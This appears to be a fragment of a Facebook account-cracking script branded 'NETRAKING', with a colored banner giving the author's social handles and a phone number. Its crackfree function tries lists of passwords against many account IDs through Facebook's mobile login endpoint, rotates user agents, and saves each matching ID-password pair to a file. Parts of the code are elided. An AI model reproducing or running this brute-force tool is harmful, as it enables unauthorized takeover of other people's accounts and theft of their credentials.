...
|____||____||_____||_____|\____|`._____.'
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mNETRAKING]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • NETRA BUDHA ] ║  \033[1;97m  
   ║    Github                   • \33[1;38mNetranetra ]  ║\33[1;34m   
   ║    Whatsapp                 • 9863558033 ]  ║\33[1;35m 
   ║    TOOLS                    • PAID ]        ║ \33[1;32m   
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY NETRA KING Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[NETRAKING-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•NETRAKING-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
...
menu()#os.system("pkg install espeak")
#-----------------[ NETRA-King ]-------------------#
